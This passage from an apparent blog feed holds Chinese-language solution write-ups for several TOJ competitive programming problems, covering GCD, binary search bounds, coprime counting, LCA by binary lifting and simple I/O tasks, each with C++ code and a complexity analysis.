<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">string</span> s;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;s;</span><br><span class="line">	n%=<span class="number">26</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(s[i]-n &lt; <span class="string">'A'</span>)</span><br><span class="line">			s[i]=s[i]-n+<span class="number">26</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			s[i]=s[i]-n;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(len(s))$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 3</title>
    <url>/2021/03/23/TOJ3/</url>
    <content><![CDATA[<h1 id="TOJ-3"><a href="#TOJ-3" class="headerlink" title="TOJ 3"></a>TOJ 3</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/3/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/3/</a></p>
<p>有 $t$ 筆測資，每筆測資包含兩個數 $a, b$，求 $a, b$ 的最大公因數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>可以模擬輾轉相除法求解，詳細過程可以參考講義內容。</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(n%m == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> m;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> gcd(m, n%m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> t,a,b;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;gcd(a,b)&lt;&lt;<span class="string">"\n"</span>;	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h3><p>證明我不知道怎麼證QQ ，不過每筆測資時間複雜度為 $O(log\ {min(a,b)})$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 468</title>
    <url>/2021/03/23/TOJ468/</url>
    <content><![CDATA[<h1 id="TOJ-468"><a href="#TOJ-468" class="headerlink" title="TOJ 468"></a>TOJ 468</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/468/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/468/</a></p>
<p>輸入包含 $n$ 個元素的序列，接下來 $m$ 筆詢問</p>
<p>每筆詢問包含兩個正整數 $p, q$，求在序列當中有多少百分比的元素介於 $p$ 至 $q$</p>
<p>小數精確至小數點後第 $k$ 位</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先對序列做排序</p>
<p>接下來題目要問的是有多少元素介於 $p, q$ 之間</p>
<p>如果我們能找到第一個 $\geq p$ 的元素位置以及第一個 $&gt; q$ 的元素位置，那麼這兩個元素之間的個數就是我們的答案</p>
<p>要找第一個 $\geq p$ 的元素位置就等同於找 lower_bound</p>
<p>要找第一個 $&gt; q$ 的元素位置就等同於找 upper_bound</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,k,m,l,r,arr[<span class="number">100010</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Lower_bound</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> q)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(l!=r)&#123;</span><br><span class="line">		<span class="comment">// &gt;= p 的要留下，其他的篩掉</span></span><br><span class="line">		<span class="keyword">int</span> mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span>(arr[mid] &lt; q) l = mid+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> r = mid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Upper_bound</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> q)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(l!=r)&#123;</span><br><span class="line">		<span class="comment">// &gt; p 的要留下，其他的篩掉</span></span><br><span class="line">		<span class="keyword">int</span> mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span>(arr[mid] &lt;= q) l = mid+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> r = mid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sort(arr, arr+n);</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;l&gt;&gt;r;</span><br><span class="line">		<span class="keyword">if</span>(l&gt;r) swap(l, r);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(k)&lt;&lt;(<span class="keyword">double</span>)((Upper_bound(<span class="number">0</span>, n, r)) - (Lower_bound(<span class="number">0</span>, n, l)))*<span class="number">100.0</span>/n&lt;&lt;<span class="string">"%\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>輸入時間複雜度為 $O(n)$</p>
<p>排序時間複雜度為 $O(nlogn)$</p>
<p>找 lower_bound 以及 upper_bound 總時間複雜度為 $O(2logn)$</p>
<p>總時間複雜度為 $O(n + nlogn)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
        <tag>Binary Search</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 47</title>
    <url>/2021/03/23/TOJ47/</url>
    <content><![CDATA[<h1 id="TOJ-47"><a href="#TOJ-47" class="headerlink" title="TOJ 47"></a>TOJ 47</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/47/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/47/</a></p>
<p>給一串長度為 $n$ 的序列，有 $m$ 筆詢問</p>
<p>對於每一筆詢問</p>
<ul>
<li>若 $q$ 存在於序列當中則直接輸出 $q$</li>
<li>若 $q$ 介於序列中的某兩連續元素之間，輸出那兩個元素</li>
<li>若 $q$ 小於序列的第零項(也就是 $q$ 小於序列中的所有元素)，則輸出<code>no</code> 以及第零個元素</li>
<li>若 $q$ 大於序列的最後項(也就是 $q$ 大於序列中的所有元素)，則輸出最後項以及 <code>no</code></li>
</ul>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>首先因為我們的答案可能藉在某兩個連續的元素之間，所以我們應該要嘗試讓序列是有<strong>嚴格遞增</strong>或是<strong>嚴格遞減</strong>的性質</p>
<p>所以我們第一步是要先將序列排序</p>
<p>排序過後，我們可以先處理兩個包含 <code>no</code> 的特例</p>
<p>直接判斷 $q$ 和 <code>arr[0]</code> 以及 <code>arr[n-1]</code> 的關係即可</p>
<p>如果 $q &lt; arr[0]$ ，就輸出 <code>no arr[0]</code></p>
<p>如果 $q &gt; arr[n-1]$ ，就輸出 <code>arr[n-1] no</code></p>
<p>接下來就是要來找我們的詢問 $q$ 是在序列中的哪個位置</p>
<p>我們可以用二分搜來序列當中第一個 $\geq q$ 的元素位置 (也就是 <code>lower_bound</code>)</p>
<p>接下來，如果找到的 $res$ 在 $arr$ 上就是 $q$ 那就直接輸出</p>
<p>否則直接輸出 <code>arr[res-1] arr[res]</code></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, q, res, arr[<span class="number">1000010</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Lower_bound</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(l!=r)&#123;</span><br><span class="line">		<span class="comment">// &gt;= p 的要留下，其他的篩掉</span></span><br><span class="line">		<span class="keyword">int</span> mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span>(arr[mid] &lt; p) l = mid+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> r = mid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	sort(arr, arr+n);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;q;</span><br><span class="line">		<span class="comment">// 先判斷包含 no 的情況</span></span><br><span class="line">		<span class="keyword">if</span>(arr[<span class="number">0</span>] &gt; q) <span class="built_in">cout</span>&lt;&lt;<span class="string">"no "</span>&lt;&lt;arr[<span class="number">0</span>]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(arr[n<span class="number">-1</span>] &lt; q) <span class="built_in">cout</span>&lt;&lt;arr[n<span class="number">-1</span>]&lt;&lt;<span class="string">" no\n"</span>;</span><br><span class="line">		<span class="comment">// 再來判斷 q 必定包含在序列當中的狀況</span></span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			res = Lower_bound(<span class="number">0</span>, n, q);</span><br><span class="line">			<span class="keyword">if</span>(arr[res] == q) <span class="built_in">cout</span>&lt;&lt;q&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;arr[res<span class="number">-1</span>]&lt;&lt;<span class="string">" "</span>&lt;&lt;arr[res]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>輸入時間複雜度為 $O(n)$</p>
<p>排序時間複雜度為 $O(nlogn)$</p>
<p>每筆詢問進行二分搜的時間複雜度為 $O(logn)$</p>
<p>總時間複雜度為 $O(n + (m+n)log)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
        <tag>Binary Search</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 412</title>
    <url>/2021/03/23/TOJ412/</url>
    <content><![CDATA[<h1 id="UVa412"><a href="#UVa412" class="headerlink" title="UVa412"></a>UVa412</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?412" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?412</a></p>
<p>給一個集合 $S$ ，從中任意取兩數 $p, q$</p>
<p>其中該集合所有 $p, q$ 對數記作 $A$， $p, q$ 互質的數量記作 $B$</p>
<p>求 $\sqrt{6*\frac{A}{B}}$ 四捨五入到小數點後第 $6$ 位</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>這裡可以用很暴力的作法完成他</p>
<p>如果兩個數互質，那兩者的最大公因數一定是 $1$</p>
<p>那麼接下來暴力去看看每一組是不是互質，記錄下來即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(n%m == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> m;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> gcd(m, n%m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="keyword">int</span> arr[<span class="number">55</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span> ; j&lt;n ; j++)&#123;</span><br><span class="line">				a++;</span><br><span class="line">				<span class="keyword">if</span>(gcd(arr[i], arr[j]) == <span class="number">1</span>)</span><br><span class="line">					b++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"No estimate for this data set.\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">6</span>)&lt;&lt;<span class="built_in">sqrt</span>((<span class="keyword">double</span>)(a*<span class="number">6.0</span>/b))&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入時間複雜度為 $O(n)$</p>
<p>每筆測資窮舉時間複雜度約為 $O(n^2{log{min(arr[i], arr[j])}})$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 5</title>
    <url>/2021/03/23/TOJ5/</url>
    <content><![CDATA[<h1 id="TOJ-5"><a href="#TOJ-5" class="headerlink" title="TOJ 5"></a>TOJ 5</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/5/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/5/</a></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(getline(<span class="built_in">cin</span>,s))&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Hello ,"</span>&lt;&lt;s&lt;&lt;<span class="string">" !\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 475</title>
    <url>/2020/09/25/TOJ475/</url>
    <content><![CDATA[<h1 id="TOJ-475"><a href="#TOJ-475" class="headerlink" title="TOJ 475"></a>TOJ 475</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://toj.tfcis.org/oj/pro/475/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/475/</a><br>LCA 模板題<br>給一個樹，求多點之間的最低共同祖先</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>每兩個點做一次 LCA 後，將答案再與下一個點做 LCA ，一直到每個查詢都遍歷過</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,q,lgN;</span><br><span class="line"><span class="keyword">int</span> P[<span class="number">1000010</span>][<span class="number">25</span>],D[<span class="number">1000010</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nxt[<span class="number">1000010</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">computeP</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;lgN ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=n ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(P[j][i]==<span class="number">-1</span>)&#123;</span><br><span class="line">				P[j][i+<span class="number">1</span>]=<span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				P[j][i+<span class="number">1</span>]=P[P[j][i]][i];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">1000010</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">computeD</span><span class="params">(<span class="keyword">int</span> px,<span class="keyword">int</span> h)</span></span>&#123;</span><br><span class="line">	D[px]=h;</span><br><span class="line">	vis[px]=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> i: nxt[px])&#123;</span><br><span class="line">		<span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">			computeD(i,h+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(D[u]&gt;D[v]) swap(u,v);</span><br><span class="line">	<span class="keyword">int</span> dis=D[v]-D[u];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=lgN ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(dis&amp;(<span class="number">1</span>&lt;&lt;i)) v=P[v][i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(v==u) <span class="keyword">return</span> v;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=lgN ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(P[u][i] != P[v][i])&#123;</span><br><span class="line">			u=P[u][i];</span><br><span class="line">			v=P[v][i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> P[u][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">1000010</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">25</span> ; j++)&#123;</span><br><span class="line">			P[i][j]=<span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS;</span><br><span class="line">	init();</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;q;</span><br><span class="line">	lgN=__lg(n);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>,p ; i&lt;=n<span class="number">-1</span> ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;p;</span><br><span class="line">		P[i][<span class="number">0</span>]=p;</span><br><span class="line">		nxt[p].emplace_back(i);</span><br><span class="line">	&#125;</span><br><span class="line">	computeP();</span><br><span class="line">	computeD(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,x,l,r ; i&lt;q ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;l;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;x<span class="number">-1</span> ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;r;</span><br><span class="line">			l=LCA(l,r);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;l&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>每筆詢問的時間複雜度為 $O(xNlogN)$ </br><br>總時間複雜度 $O(qxNlogN)$ </br></p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
        <tag>LCA</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 521</title>
    <url>/2021/03/23/TOJ521/</url>
    <content><![CDATA[<h1 id="TOJ-521"><a href="#TOJ-521" class="headerlink" title="TOJ 521"></a>TOJ 521</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/521/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/521/</a></p>
<p>給兩個數 $m, p$ 求 $m-p$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m,p;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;p;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;m-p&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ470</title>
    <url>/2020/07/03/TOJ470/</url>
    <content><![CDATA[<h1 id="TOJ470"><a href="#TOJ470" class="headerlink" title="TOJ470"></a>TOJ470</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://toj.tfcis.org/oj/pro/470/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/470/</a><br>給每天訓練的成效值，在不能練續兩天訓練的前提下，問最多能獲得多少成效值</p>
